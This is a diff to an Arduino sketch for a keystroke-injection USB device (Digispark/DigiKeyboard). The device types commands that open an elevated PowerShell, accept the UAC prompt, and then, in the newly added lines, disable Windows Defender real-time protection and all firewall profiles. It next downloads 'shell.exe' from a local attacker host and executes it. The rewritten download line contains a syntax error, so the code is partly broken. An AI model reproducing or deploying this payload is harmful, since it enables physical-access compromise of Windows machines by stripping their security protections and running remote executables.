@@ -11,21 +11,16 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.print("powershell Start-Process powershell -Verb runAs");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(2500);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
   DigiKeyboard.delay(1000);
+  //Disable windows firewall and defender
+  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true"); 
+  DigiKeyboard.delay(300);
+  DigiKeyboard.println("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
+  DigiKeyboard.delay(300);
   // change 'http://192.168.0.24/shell.exe' to wherever you wish to download your executable from
-  DigiKeyboard.print("Set-MpPreference -DisableRea $true;$d = New-Object System.Net.WebClient;$f = '1.exe';$d.DownloadFile('http://192.168.0.24/shell.exe',$f);$e = New-Object -com shell.application; $e.shellexecute($f);");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.println("$d = New-Object System.Net.WebClient;$f = 'FILENAME.exe';$url='http://192.168.0.24/shell.exe'$;d.DownloadFile($url,$f);$e = New-Object -com shell.application; $e.shellexecute($f);exit;");
   DigiKeyboard.delay(500);
-  ExitShell();
   while(1);
-}
-
-void ExitShell()
-{
-  DigiKeyboard.print("exit");
-  DigiKeyboard.delay(100);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
 }
